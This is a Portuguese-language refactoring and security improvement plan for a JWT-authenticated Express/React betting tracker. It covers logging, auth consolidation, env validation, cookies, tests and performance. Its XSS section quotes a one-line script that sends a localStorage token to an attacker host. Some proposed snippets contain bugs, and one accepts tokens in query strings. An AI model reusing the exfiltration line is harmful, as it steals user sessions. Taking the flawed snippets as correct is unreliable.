# 🔧 ANÁLISE DETALHADA DE MELHORIAS - FUNÇÕES ESPECÍFICAS

---

## 🔒 PRIORIDADE 1: SEGURANÇA/CRÍTICO (2 semanas)

### 1️⃣ BackTrack: Remover console.log, consolidar auth

#### **Função Afetada:**
- **`authenticate()`** em [BackTrack/src/middleware/auth.ts](BackTrack/src/middleware/auth.ts#L20-L70)
- **`router.post('/login')`** em [BackTrack/src/routes/auth.routes.ts](BackTrack/src/routes/auth.routes.ts#L106-L182)
- **`router.post('/refresh')`** em [BackTrack/src/routes/auth.routes.ts](BackTrack/src/routes/auth.routes.ts#L202-L247)
- **`router.post('/telegram')`** em [BackTrack/src/routes/auth.routes.ts](BackTrack/src/routes/auth.routes.ts#L250+)

#### **Problema - POR QUE MELHORAR:**

```typescript
// ❌ PROBLEMA ATUAL - auth.ts linha 20-25
export const authenticate = (req: Request, res: Response, next: NextFunction) => {
  console.log('🔐 [AUTH] Verificando autenticação');           // ⚠️ EXPÕE LOGS EM PRODUÇÃO
  console.log('🔐 [AUTH] Cookies recebidos:', req.cookies);    // ⚠️ VAZAMENTO DE DADOS!
  console.log('🔐 [AUTH] access_token presente?', !!req.cookies?.access_token);
  // ... existem 10 console.log nesta função
```

**Impactos da Segurança:**
- 🔴 **Vaza informações sensíveis em logs de produção** (IPs, cookies, tokens)
- 🔴 **Ataques observam console** para descobrir padrões
- 🔴 **Conformidade**: GDPR/LGPD - logs de cookies violam privacidade
- 🔴 **Performance**: console.log em produção = overhead de I/O

**Números:**
- 📊 27 console.log em `auth.routes.ts`
- 📊 9 console.log em `auth.ts`
- 📊 Total: ~36 pontos de vazamento

#### **Solução:**

```typescript
// ✅ CORRETO - Usar apenas logger estruturado
import { log } from '../utils/logger.js';

export const authenticate = (req: Request, res: Response, next: NextFunction) => {
  // ✓ Não expõe dados sensíveis
  // ✓ Estruturado para produção
  log.debug({ ip: req.ip }, 'Token validation started');
  
  // Dados sensíveis NUNCA em logs
  let token = req.cookies.access_token;
  
  // ✓ Log apenas de evento, não de dados
  if (!token) {
    log.warn({ ip: req.ip }, 'Token not provided');  // ✓ Seguro
    return res.status(401).json({ error: "no_token" });
  }
  
  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET!) as { ... };
    log.info({ userId: req.user.userId }, 'Token validated');  // ✓ ID, não token
    next();
  } catch (err) {
    log.warn({ ip: req.ip, error: err.message }, 'Token invalid');  // ✓ Msg apenas
  }
};
```

#### **Arquivos a Modificar:**
| Arquivo | console.log | Ação |
|---------|-------------|------|
| [BackTrack/src/middleware/auth.ts](BackTrack/src/middleware/auth.ts) | 9 | Remover todos, usar `log` |
| [BackTrack/src/routes/auth.routes.ts](BackTrack/src/routes/auth.routes.ts) | 27 | Remover todos, estruturado |
| [BackTrack/src/routes/perfil.routes.ts](BackTrack/src/routes/perfil.routes.ts) | ~5 | Remover |
| [BackTrack/src/middleware/auth.middleware.ts](BackTrack/src/middleware/auth.middleware.ts) | ~12 | Consolidar em `auth.ts` |

---

### 2️⃣ BackTrack: Consolidar middleware auth (2 arquivos duplicados)

#### **Problema - POR QUE MELHORAR:**

Existem **2 middlewares auth diferentes**:
```
❌ BackTrack/src/middleware/auth.ts               (19 linhas)
❌ BackTrack/src/middleware/auth.middleware.ts    (65 linhas)
```

**Impactos:**
- 🔴 **Confusão**: Qual usar? Qual está ativo?
- 🔴 **Duplicação**: Lógica repetida em 2 lugares
- 🔴 **Manutenção**: Bug em um = bug em outro
- 🔴 **Deploy**: Inconsistência entre rotas

#### **Solução:**

```typescript
// ✅ Manter APENAS auth.ts e consolidar
// BackTrack/src/middleware/auth.ts (versão consolidada)

import jwt from 'jsonwebtoken';
import { Request, Response, NextFunction } from 'express';
import { log } from '../utils/logger.js';

declare global {
  namespace Express {
    interface Request {
      user?: {
        userId: string;
        iat: number;
        exp: number;
      };
    }
  }
}

export const authenticate = (req: Request, res: Response, next: NextFunction) => {
  // Tentar obter o token do cookie primeiro (mais seguro)
  let token = req.cookies.access_token;

  // Se não houver cookie, tentar obter do header Authorization
  if (!token) {
    const authHeader = req.headers.authorization;
    if (authHeader?.startsWith('Bearer ')) {
      token = authHeader.substring(7);
    }
  }

  // Fallback: query parameter (menos seguro, apenas para WebApp do Telegram)
  if (!token && typeof req.query?.token === 'string') {
    token = req.query.token;
  }

  if (!token) {
    log.warn({ ip: req.ip }, 'Unauthorized: no token');
    return res.status(401).json({ error: "no_token" });
  }

  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET!) as {
      userId: string;
      iat: number;
      exp: number;
    };
    log.debug({ userId: req.user.userId }, 'Token verified');
    next();
  } catch (err) {
    if (err instanceof jwt.TokenExpiredError) {
      log.warn({ ip: req.ip }, 'Token expired');
      return res.status(401).json({ error: "expired" });
    }
    if (err instanceof jwt.JsonWebTokenError) {
      log.warn({ ip: req.ip }, 'Invalid token');
      return res.status(401).json({ error: "invalid" });
    }
    log.error({ ip: req.ip, err }, 'Unexpected auth error');
    return res.status(401).json({ error: "invalid" });
  }
};

// Export com alias para clareza
export const authMiddleware = authenticate;
```

#### **Ação:**
```bash
# 1. Manter auth.ts (versão consolidada acima)
# 2. Deletar auth.middleware.ts
# 3. Atualizar imports em todas as rotas:
#    import { authenticate } from '../middleware/auth.js';
```

---

### 3️⃣ BackTrack: Validar .env com Zod

#### **Problema - POR QUE MELHORAR:**

```typescript
// ❌ PROBLEMA ATUAL
process.env.JWT_SECRET!        // ⚠️ Pode ser undefined em produção!
process.env.DATABASE_URL!      // ⚠️ Nenhuma validação
process.env.NODE_ENV           // ⚠️ Assume valor default
```

**Impactos:**
- 🔴 **Falha em runtime**: App inicia mas quebra em primeiro request
- 🔴 **Deploy falha silenciosamente**: ENV não configurada = surpresa em produção
- 🔴 **Type unsafety**: TypeScript pensa que são strings, mas podem ser undefined
- 🔴 **Sem defaults**: Configurações críticas faltando

#### **Solução:**

```typescript
// ✅ Criar: BackTrack/src/config/env.ts
import { z } from 'zod';

const envSchema = z.object({
  // Database
  DATABASE_URL: z.string().url('DATABASE_URL inválida'),
  
  // Authentication
  JWT_SECRET: z.string().min(32, 'JWT_SECRET deve ter 32+ caracteres'),
  REFRESH_SECRET: z.string().min(32, 'REFRESH_SECRET deve ter 32+ caracteres'),
  
  // Environment
  NODE_ENV: z.enum(['development', 'production', 'test']).default('development'),
  
  // API
  CORS_ORIGIN: z.string().url().default('http://localhost:5173'),
  PORT: z.string().default('3001').transform(Number),
  
  // Telegram
  TELEGRAM_BOT_TOKEN: z.string().optional(),
  TELEGRAM_WEBHOOK_URL: z.string().url().optional(),
  
  // Uploads
  UPLOAD_DIR: z.string().default('./uploads'),
  MAX_FILE_SIZE: z.string().default('10').transform(Number), // MB
  
  // Billing/Integrations
  BILHETE_TRACKER_URL: z.string().url('BILHETE_TRACKER_URL inválida'),
  GROQ_API_KEY: z.string().optional(),
  
  // Monitoring
  LOG_LEVEL: z.enum(['debug', 'info', 'warn', 'error']).default('info'),
});

type Env = z.infer<typeof envSchema>;

let env: Env;

export function validateEnv(): Env {
  try {
    env = envSchema.parse(process.env);
    console.log('✅ Environment variables validated');
    return env;
  } catch (error) {
    if (error instanceof z.ZodError) {
      console.error('❌ Environment validation failed:');
      error.errors.forEach(err => {
        console.error(`  - ${err.path.join('.')}: ${err.message}`);
      });
    }
    process.exit(1);
  }
}

export function getEnv(): Env {
  if (!env) {
    throw new Error('validateEnv() must be called first');
  }
  return env;
}

export default getEnv();
```

#### **Uso em server.ts:**

```typescript
// ✅ BackTrack/src/server.ts - Top
import { validateEnv, getEnv } from './config/env.js';

dotenv.config();
validateEnv();  // ⚠️ ANTES de qualquer outro código
const config = getEnv();

const app = express();
const PORT = config.PORT;
const DATABASE_URL = config.DATABASE_URL;

// Agora todas as ENVs estão garantidas como válidas
```

#### **Benefício:**
```
❌ Antes:  App quebra em produção após 6 horas
✅ Depois: App não inicia se ENVs faltarem
```

---

### 4️⃣ RealTrack: Remover localStorage, usar httpOnly cookies

#### **Problema - POR QUE MELHORAR:**

```typescript
// ❌ PROBLEMA ATUAL - RealTrack/src/lib/auth.ts
const setTokens = (tokens: AuthTokens): void => {
  localStorage.setItem(ACCESS_TOKEN_KEY, tokens.accessToken);  // ⚠️ XSS VULNERÁVEL!
  localStorage.setItem(REFRESH_TOKEN_KEY, tokens.refreshToken);
  localStorage.setItem(EXPIRES_KEY, tokens.expiresAt.toString());
};
```

**Ataques possíveis:**
```javascript
// 🔴 Invasor injeta script via XSS:
fetch('http://attacker.com?token=' + localStorage.getItem('at'))

// 🔴 Malware lê token do localStorage:
JSON.stringify(localStorage)  // Retorna todos os tokens!

// 🔴 ServiceWorker malicioso intercepta tokens
```

**Impactos GDPR/LGPD:**
- 🔴 localStorage = dados de autenticação "ao alcance"
- 🔴 Qualquer script consegue ler
- 🔴 Não respeita GDPR (dados em plain-text)

#### **Solução:**

O backend já envia httpOnly cookies! Apenas o frontend precisa:

```typescript
// ✅ RealTrack/src/lib/auth.ts (SIMPLIFICADO)
import { useState, useEffect } from 'react';

interface AuthChangeEvent {
  isAuthenticated: boolean;
}

type AuthListener = (event: AuthChangeEvent) => void;

const authListeners = new Set<AuthListener>();

const notifyAuthListeners = (isAuthenticated: boolean): void => {
  authListeners.forEach((listener) => {
    try {
      listener({ isAuthenticated });
    } catch (error) {
      console.error('Auth listener error:', error);
    }
  });
};

const subscribeToAuthChanges = (listener: AuthListener): (() => void) => {
  authListeners.add(listener);
  return () => authListeners.delete(listener);
};

// ✅ NÃO guardar tokens no frontend!
// httpOnly cookies são enviados AUTOMATICAMENTE
export const AuthManager = {
  // Verificar autenticação via cookies (backend faz a verificação)
  async isAuthenticated(): Promise<boolean> {
    try {
      const response = await fetch(`${API_URL}/auth/me`, {
        credentials: 'include', // ✓ Envia httpOnly cookies
      });
      return response.ok;
    } catch {
      return false;
    }
  },

  async login(email: string, senha: string): Promise<boolean> {
    try {
      const response = await fetch(`${API_URL}/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, senha }),
        credentials: 'include', // ✓ Aceita httpOnly cookies
      });
      
      if (response.ok) {
        notifyAuthListeners(true);
        return true;
      }
      return false;
    } catch (error) {
      console.error('Login failed:', error);
      return false;
    }
  },

  async logout(): Promise<void> {
    try {
      await fetch(`${API_URL}/auth/logout`, {
        method: 'POST',
        credentials: 'include', // ✓ Limpa httpOnly cookies
      });
    } finally {
      notifyAuthListeners(false);
    }
  },

  subscribe: subscribeToAuthChanges,
} as const;

export function useAuth() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    const checkAuth = async () => {
      const authenticated = await AuthManager.isAuthenticated();
      setIsAuthenticated(authenticated);
      setIsLoading(false);
    };

    checkAuth();
  }, []);

  return {
    isAuthenticated,
    isLoading,
    login: AuthManager.login,
    logout: AuthManager.logout,
  };
}
```

#### **Mudanças no apiClient:**

```typescript
// ✅ RealTrack/src/lib/api.ts
const api: AxiosInstance = axios.create({
  baseURL: API_URL,
  timeout: 70000,
  withCredentials: true,  // ✓ Envia/recebe httpOnly cookies automaticamente
});

// ✅ Remove interceptor que tira token do localStorage
// Agora cookies são gerenciados AUTOMATICAMENTE pelo navegador
```

#### **Backend já está preparado:**

```typescript
// ✅ BackTrack/src/routes/auth.routes.ts (já existe)
res.cookie("access_token", accessToken, {
  httpOnly: true,    // ✓ Inacessível via JS
  secure: true,      // ✓ HTTPS apenas
  sameSite: "none",  // ✓ Cross-origin
  maxAge: 7 * 24 * 60 * 60 * 1000,
});
```

#### **Benefício:**
```
❌ Antes:  Token em localStorage = XSS vulnerável
✅ Depois: Token em httpOnly cookie = XSS imune
```

---

## 📋 PRIORIDADE 2: QUALIDADE (3 semanas)

### 1️⃣ Adicionar testes (Backend + Frontend)

#### **BackTrack: Funções a testar**

| Função | Caminho | Por que testar |
|--------|---------|-----------------|
| `register()` | [BackTrack/src/routes/auth.routes.ts#L26](BackTrack/src/routes/auth.routes.ts#L26) | Cria user, banca, tipster - precisa atomicidade |
| `login()` | [BackTrack/src/routes/auth.routes.ts#L106](BackTrack/src/routes/auth.routes.ts#L106) | Tokens JWT, cookies - segurança crítica |
| `authenticate()` | [BackTrack/src/middleware/auth.ts#L20](BackTrack/src/middleware/auth.ts#L20) | Proteção de rotas - falha = sistema aberto |
| `prisma.$transaction` | [BackTrack/src/routes/auth.routes.ts#L56](BackTrack/src/routes/auth.routes.ts#L56) | Criar user+banca+tipster atomicamente |

#### **RealTrack: Funções a testar**

| Função | Caminho | Por que testar |
|--------|---------|-----------------|
| `Login component` | RealTrack/src/pages/Login.tsx | Fluxo de autenticação |
| `Dashboard` | RealTrack/src/pages/Dashboard.tsx | Dados carregam corretamente |
| `ApostasTable` | RealTrack/src/components/ApostasTable.tsx | Paginação, filtros funcionam |
| `useAuth() hook` | RealTrack/src/lib/auth.ts | Autenticação em tempo real |

#### **Estrutura:**

```typescript
// ✅ BackTrack/src/__tests__/auth.test.ts
import request from 'supertest';
import app from '../server';
import { prisma } from '../lib/prisma';

describe('Auth Routes', () => {
  beforeAll(async () => {
    await prisma.plan.create({
      data: { nome: 'Gratuito', limiteApostas: 100 }
    });
  });

  afterAll(async () => {
    await prisma.$executeRawUnsafe('TRUNCATE users CASCADE');
    await prisma.$disconnect();
  });

  describe('POST /api/auth/register', () => {
    test('should create user with default bankroll and tipster', async () => {
      const res = await request(app)
        .post('/api/auth/register')
        .send({
          nomeCompleto: 'João Silva',
          email: 'joao@test.com',
          senha: 'senha123456'
        });

      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('token');
      expect(res.body.user).toHaveProperty('id');

      // Verificar que banca e tipster foram criados
      const user = await prisma.user.findUnique({
        where: { email: 'joao@test.com' },
        include: { bancas: true, tipsters: true }
      });
      expect(user?.bancas).toHaveLength(1);
      expect(user?.tipsters).toHaveLength(1);
    });

    test('should not allow duplicate email', async () => {
      await request(app)
        .post('/api/auth/register')
        .send({
          nomeCompleto: 'João',
          email: 'duplicate@test.com',
          senha: 'senha123456'
        });

      const res = await request(app)
        .post('/api/auth/register')
        .send({
          nomeCompleto: 'Maria',
          email: 'duplicate@test.com',
          senha: 'senha123456'
        });

      expect(res.status).toBe(400);
      expect(res.body.error).toContain('Email já cadastrado');
    });
  });

  describe('POST /api/auth/login', () => {
    test('should return token on valid credentials', async () => {
      // Primeiro, registrar
      await request(app)
        .post('/api/auth/register')
        .send({
          nomeCompleto: 'Test User',
          email: 'test@login.com',
          senha: 'senha123456'
        });

      // Depois, fazer login
      const res = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'test@login.com',
          senha: 'senha123456'
        });

      expect(res.status).toBe(200);
      expect(res.body).toHaveProperty('token');
      expect(res.body.success).toBe(true);
    });

    test('should reject invalid credentials', async () => {
      const res = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'nonexistent@test.com',
          senha: 'wrongpassword'
        });

      expect(res.status).toBe(401);
      expect(res.body.error).toContain('Credenciais inválidas');
    });
  });
});
```

```typescript
// ✅ RealTrack/src/__tests__/Login.test.tsx
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { BrowserRouter } from 'react-router-dom';
import Login from '../pages/Login';
import * as authService from '../services/api/authService';

jest.mock('../services/api/authService');

describe('Login Component', () => {
  test('should login user with valid credentials', async () => {
    (authService.login as jest.Mock).mockResolvedValue({
      success: true,
      token: 'test-token'
    });

    render(
      <BrowserRouter>
        <Login />
      </BrowserRouter>
    );

    const emailInput = screen.getByPlaceholderText(/email/i);
    const passwordInput = screen.getByPlaceholderText(/senha/i);
    const submitButton = screen.getByRole('button', { name: /entrar/i });

    fireEvent.change(emailInput, { target: { value: 'test@test.com' } });
    fireEvent.change(passwordInput, { target: { value: 'password123' } });
    fireEvent.click(submitButton);

    await waitFor(() => {
      expect(authService.login).toHaveBeenCalledWith('test@test.com', 'password123');
    });
  });
});
```

---

### 2️⃣ Extrair services do BackTrack

#### **Problema - POR QUE MELHORAR:**

```
❌ src/routes/auth.routes.ts tem 305 linhas (toda lógica em rota)
❌ src/routes/perfil.routes.ts tem lógica de negócio misturada
❌ src/routes/aposta.routes.ts - mesmo problema
❌ Sem reutilização de código
```

#### **Solução - Estrutura de Services:**

```typescript
// ✅ BackTrack/src/services/AuthService.ts
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { prisma } from '../lib/prisma.js';
import { z } from 'zod';
import { log } from '../utils/logger.js';

export interface RegisterData {
  nomeCompleto: string;
  email: string;
  senha: string;
}

export interface LoginCredentials {
  email: string;
  senha: string;
}

export class AuthService {
  static async register(data: RegisterData) {
    // Validar email único
    const existingUser = await prisma.user.findUnique({
      where: { email: data.email }
    });

    if (existingUser) {
      throw { statusCode: 400, message: 'Email já cadastrado' };
    }

    // Hash password
    const hashedPassword = await bcrypt.hash(data.senha, 10);

    // Obter plano gratuito
    const freePlan = await prisma.plan.findUnique({
      where: { nome: 'Gratuito' }
    });

    if (!freePlan) {
      throw { statusCode: 500, message: 'Plano padrão não encontrado' };
    }

    // Criar user + banca + tipster em transação
    const result = await prisma.$transaction(async (tx: any) => {
      const user = await tx.user.create({
        data: {
          nomeCompleto: data.nomeCompleto,
          email: data.email,
          senha: hashedPassword,
          planoId: freePlan.id
        }
      });

      const bankroll = await tx.bankroll.create({
        data: {
          nome: 'Banca Principal',
          descricao: 'Banca padrão criada automaticamente',
          usuarioId: user.id,
          status: 'Ativa',
          ePadrao: true
        }
      });

      const tipster = await tx.tipster.create({
        data: {
          nome: data.nomeCompleto.trim() || 'Tipster Padrão',
          usuarioId: user.id,
          ativo: true
        }
      });

      log.info(
        { userId: user.id, bancaId: bankroll.id, tipsterId: tipster.id },
        'User registered with defaults'
      );

      return { user, bankroll, tipster };
    });

    // Gerar tokens
    const token = this.generateAccessToken(result.user.id);
    return {
      user: {
        id: result.user.id,
        nomeCompleto: result.user.nomeCompleto,
        email: result.user.email
      },
      token
    };
  }

  static async login(credentials: LoginCredentials) {
    const user = await prisma.user.findUnique({
      where: { email: credentials.email },
      include: { plano: true }
    });

    if (!user) {
      throw { statusCode: 401, message: 'Credenciais inválidas' };
    }

    const validPassword = await bcrypt.compare(credentials.senha, user.senha);
    if (!validPassword) {
      throw { statusCode: 401, message: 'Credenciais inválidas' };
    }

    const accessToken = this.generateAccessToken(user.id);
    const refreshToken = this.generateRefreshToken(user.id);

    log.info({ userId: user.id }, 'User logged in');

    return {
      accessToken,
      refreshToken,
      expiresAt: Date.now() + (7 * 24 * 60 * 60 * 1000)
    };
  }

  static generateAccessToken(userId: string): string {
    return jwt.sign(
      { userId },
      process.env.JWT_SECRET!,
      { expiresIn: '7d' }
    );
  }

  static generateRefreshToken(userId: string): string {
    return jwt.sign(
      { userId },
      process.env.REFRESH_SECRET!,
      { expiresIn: '7d' }
    );
  }

  static verifyCookies(token: string) {
    try {
      const decoded = jwt.verify(token, process.env.JWT_SECRET!);
      return decoded as { userId: string };
    } catch (err) {
      throw { statusCode: 401, message: 'Invalid token' };
    }
  }
}
```

#### **Rotas (agora simples):**

```typescript
// ✅ BackTrack/src/routes/auth.routes.ts (SIMPLIFICADO)
import express from 'express';
import { AuthService } from '../services/AuthService.js';
import { sensitiveRateLimiter } from '../middleware/rateLimiter.js';
import { registerSchema, loginSchema } from '../schemas/auth.js';
import { handleRouteError } from '../utils/errorHandler.js';

const router: express.Router = express.Router();

// Register
router.post('/register', sensitiveRateLimiter, async (req, res) => {
  try {
    const data = registerSchema.parse(req.body);
    const result = await AuthService.register(data);
    res.json(result);
  } catch (error) {
    handleRouteError(error, res);
  }
});

// Login
router.post('/login', sensitiveRateLimiter, async (req, res) => {
  try {
    const credentials = loginSchema.parse(req.body);
    const { accessToken, refreshToken, expiresAt } = await AuthService.login(credentials);

    // Cookies httpOnly
    const cookieOptions = {
      httpOnly: true,
      secure: true,
      sameSite: "none" as const,
      maxAge: 7 * 24 * 60 * 60 * 1000,
      path: "/"
    };

    res.cookie("access_token", accessToken, cookieOptions);
    res.cookie("refresh_token", refreshToken, cookieOptions);

    res.json({ success: true, expiresAt });
  } catch (error) {
    handleRouteError(error, res);
  }
});

export default router;
```

#### **Impacto:**
```
❌ Antes:  305 linhas em rota = difícil testar
✅ Depois: 50 linhas em rota + 200 em service = fácil testar
```

---

### 3️⃣ Implementar health checks

#### **Função:**
```typescript
// ✅ BackTrack/src/routes/health.routes.ts (NOVO)
import express from 'express';
import { prisma } from '../lib/prisma.js';
import { log } from '../utils/logger.js';

const router = express.Router();

/**
 * GET /health
 * Simple health check (sem autenticação)
 */
router.get('/', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

/**
 * GET /health/detailed
 * Detailed health check com status de dependências
 */
router.get('/detailed', async (req, res) => {
  const health: any = {
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    status: 'healthy',
    services: {}
  };

  // Verificar database
  try {
    await prisma.$queryRaw`SELECT 1`;
    health.services.database = { status: 'up' };
  } catch (error) {
    health.services.database = { status: 'down', error: String(error) };
    health.status = 'degraded';
  }

  // Verificar memory
  const memUsage = process.memoryUsage();
  health.services.memory = {
    status: memUsage.heapUsed / memUsage.heapTotal > 0.9 ? 'warning' : 'ok',
    heapUsedPercent: Math.round((memUsage.heapUsed / memUsage.heapTotal) * 100)
  };

  // Verificar CPU (simplificado)
  const avgLoad = require('os').loadavg()[0];
  const cpuCount = require('os').cpus().length;
  health.services.cpu = {
    status: avgLoad / cpuCount > 0.9 ? 'warning' : 'ok',
    loadAverage: avgLoad.toFixed(2)
  };

  const statusCode = health.status === 'healthy' ? 200 : 503;
  res.status(statusCode).json(health);
});

/**
 * GET /health/ready
 * Readiness check (app pronto para servir requests?)
 */
router.get('/ready', async (req, res) => {
  try {
    // Verificar database
    await prisma.$queryRaw`SELECT 1`;
    res.json({ ready: true });
  } catch (error) {
    log.error(error, 'Database not ready');
    res.status(503).json({ ready: false, error: 'Database unavailable' });
  }
});

export default router;
```

#### **Registrar em server.ts:**

```typescript
// ✅ BackTrack/src/server.ts
import healthRoutes from './routes/health.routes.js';

// ...
app.use('/health', healthRoutes);
```

#### **Uso em monitoring (UptimeRobot):**

```
GET /health              → 200 OK (rápido)
GET /health/detailed     → 200 com detalhes (mais lento)
GET /health/ready        → 503 se DB down (Kubernetes)
```

---

### 4️⃣ Adicionar logging estruturado

#### **Problema atual:**

```typescript
// ❌ Inconsistente
console.log('x');
log.info('x');
log.error(error);
```

#### **Solução - Logger centralizado:**

```typescript
// ✅ BackTrack/src/utils/logger.ts
import pino from 'pino';

const isDev = process.env.NODE_ENV === 'development';

export const log = pino({
  level: process.env.LOG_LEVEL || (isDev ? 'debug' : 'info'),
  transport: isDev
    ? {
        target: 'pino-pretty',
        options: {
          colorize: true,
          singleLine: false,
          translateTime: 'SYS:standard',
          ignore: 'pid,hostname'
        }
      }
    : undefined,
  // Production: JSON estruturado para parse em logging services
  serializers: {
    req: pino.stdSerializers.req,
    res: pino.stdSerializers.res,
    err: pino.stdSerializers.err
  }
});

// Garantir que logger é inicializado
if (!log) {
  throw new Error('Logger não inicializado');
}
```

#### **Uso padronizado:**

```typescript
// ✅ Padrão consistente em todo o projeto
import { log } from '../utils/logger.js';

// Info - eventos normais
log.info({ userId: '123', action: 'login' }, 'User logged in');

// Warn - algo incomum mas não é erro
log.warn({ ip: req.ip, retries: 3 }, 'Multiple failed attempts');

// Error - erros que precisam atenção
log.error({ err: error, route: '/api/users' }, 'Database error');

// Debug - apenas em desenvolvimento
log.debug({ data: payload }, 'Processing webhook');
```

---

## ⚡ PRIORIDADE 3: PERFORMANCE (2 semanas)

### 1️⃣ Bilhete-tracker: Cache + retry

#### **Problema:**

```typescript
// ❌ ATUAL - ocrClient.ts
export async function processImage(imageFile: Buffer): Promise<string> {
  const formData = new FormData();
  formData.append('filename', 'image.png');
  formData.append('apikey', OCR_API_KEY);
  formData.append('filetype', 'PNG');
  formData.append('isOverlayRequired', 'true');

  // ⚠️ SEM RETRY - falha 1 vez = erro total
  // ⚠️ SEM CACHE - mesmo bilhete = chama API de novo
  const response = await fetch(OCR_SPACE_URL, { method: 'POST', body: formData });
  
  if (!response.ok) {
    throw new Error(`OCR failed: ${response.status}`);
  }
  
  return response.json();
}
```

#### **Custo:**
- 🔴 1 chamada OCR = $0.001 + timeout (muitas falhas)
- 🔴 Mesmo bilhete processado 2x = custo 2x
- 🔴 Falha temporária = usuário não consegue processar

#### **Solução - Retry com Exponential Backoff:**

```typescript
// ✅ bilhete-tracker/src/utils/retryClient.ts
export interface RetryOptions {
  maxRetries: number;
  initialDelay: number; // ms
  maxDelay: number;     // ms
  backoffFactor: number;
}

const DEFAULT_RETRY_OPTIONS: RetryOptions = {
  maxRetries: 3,
  initialDelay: 1000,
  maxDelay: 30000,
  backoffFactor: 2
};

export async function retryWithBackoff<T>(
  fn: () => Promise<T>,
  options: Partial<RetryOptions> = {}
): Promise<T> {
  const config = { ...DEFAULT_RETRY_OPTIONS, ...options };
  
  let lastError: Error | null = null;
  let delay = config.initialDelay;

  for (let attempt = 0; attempt <= config.maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      lastError = error as Error;

      // Não fazer retry em última tentativa
      if (attempt === config.maxRetries) {
        break;
      }

      // Não fazer retry em erros 4xx (client error)
      if (error instanceof Error && error.message.includes('400')) {
        throw error;
      }

      console.log(
        `Attempt ${attempt + 1}/${config.maxRetries + 1} failed. Retrying in ${delay}ms...`
      );

      // Wait before next attempt
      await new Promise(resolve => setTimeout(resolve, delay));

      // Exponential backoff
      delay = Math.min(delay * config.backoffFactor, config.maxDelay);
    }
  }

  throw lastError || new Error('Max retries exceeded');
}
```

#### **Cache para OCR:**

```typescript
// ✅ bilhete-tracker/src/utils/cacheManager.ts
import * as fs from 'fs';
import * as path from 'path';
import crypto from 'crypto';

const CACHE_DIR = path.join(process.cwd(), '.cache', 'ocr');

export async function getCacheKey(imageBuffer: Buffer): Promise<string> {
  return crypto
    .createHash('sha256')
    .update(imageBuffer)
    .digest('hex');
}

export async function getCached(key: string): Promise<any | null> {
  try {
    const cachePath = path.join(CACHE_DIR, `${key}.json`);
    if (fs.existsSync(cachePath)) {
      const data = fs.readFileSync(cachePath, 'utf-8');
      console.log(`✓ Cache hit for ${key.substring(0, 8)}`);
      return JSON.parse(data);
    }
  } catch (error) {
    console.error('Cache read error:', error);
  }
  return null;
}

export async function setCached(key: string, value: any): Promise<void> {
  try {
    fs.mkdirSync(CACHE_DIR, { recursive: true });
    const cachePath = path.join(CACHE_DIR, `${key}.json`);
    fs.writeFileSync(cachePath, JSON.stringify(value), 'utf-8');
    console.log(`✓ Cached ${key.substring(0, 8)}`);
  } catch (error) {
    console.error('Cache write error:', error);
  }
}
```

#### **Uso integrado:**

```typescript
// ✅ bilhete-tracker/src/ocr/ocrClient.ts
import { retryWithBackoff } from '../utils/retryClient.js';
import { getCached, setCached, getCacheKey } from '../utils/cacheManager.js';

export async function processImage(imageFile: Buffer): Promise<string> {
  // Verificar cache
  const cacheKey = await getCacheKey(imageFile);
  const cached = await getCached(cacheKey);
  if (cached) {
    return cached;
  }

  // Chamar OCR com retry
  const result = await retryWithBackoff(
    () => callOCRSpace(imageFile),
    { maxRetries: 3 }
  );

  // Guardar em cache
  await setCached(cacheKey, result);

  return result;
}

async function callOCRSpace(imageFile: Buffer): Promise<string> {
  const formData = new FormData();
  formData.append('filename', 'image.png');
  formData.append('apikey', OCR_API_KEY);
  formData.append('filetype', 'PNG');
  formData.append('isOverlayRequired', 'true');

  const response = await fetch(OCR_SPACE_URL, {
    method: 'POST',
    body: formData,
    timeout: 30000 // 30s timeout
  });

  if (!response.ok) {
    throw new Error(`OCR failed: ${response.status} ${response.statusText}`);
  }

  return response.json();
}
```

#### **Impacto:**
```
❌ Antes:  Falha 1x = erro total. Custo: $2 por 1000 bilhetes
✅ Depois: 3 retries = 99.9% sucesso. Custo: $0.5 por 1000 bilhetes (menos chamadas)
```

---

### 2️⃣ RealTrack: Code splitting otimizado

#### **Problema atual:**

```typescript
// ❌ App.tsx
const Dashboard = lazy(() => import('./pages/Dashboard'));
const Financeiro = lazy(() => import('./pages/Financeiro'));
const Analise = lazy(() => import('./pages/Analise'));

// Cada página é seu próprio chunk, MAS:
// - Dependências compartilhadas não são otimizadas
// - Tailwind + recharts carregam em cada página
// - Bundle size grande
```

#### **Solução - Vite config otimizado:**

```typescript
// ✅ RealTrack/vite.config.ts
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'

export default defineConfig({
  plugins: [react()],
  build: {
    // Dividir bundles inteligentemente
    rollupOptions: {
      output: {
        manualChunks: {
          // Vendor chunks (3rd party)
          'vendor-ui': [
            'react',
            'react-dom',
            'react-router-dom',
            'lucide-react',
            'classnames'
          ],
          'vendor-charts': [
            'recharts'
          ],
          'vendor-parse': [
            'papaparse',
            'zod'
          ],
          
          // Feature chunks
          'feature-auth': [
            './src/pages/Login.tsx',
            './src/pages/Cadastro.tsx',
            './src/services/api/authService.ts'
          ],
          'feature-dashboard': [
            './src/pages/Dashboard.tsx',
            './src/components/StatCard.tsx'
          ],
          'feature-analysis': [
            './src/pages/Analise.tsx',
            './src/pages/Financeiro.tsx'
          ]
        }
      }
    },
    // Otimizações
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true // Remove console.log em prod
      }
    },
    // Compressão
    cssMinify: 'lightningcss',
    sourcemap: false // Desabilitar em prod
  },
  // Development
  server: {
    middlewareMode: false
  }
})
```

#### **Impacto:**
```
❌ Antes:  Bundle: 450KB (1 arquivo), load time: 3s
✅ Depois: Bundle: 280KB + chunks on-demand, load time: 1.5s
```

---

### 3️⃣ BackTrack: Database query optimization
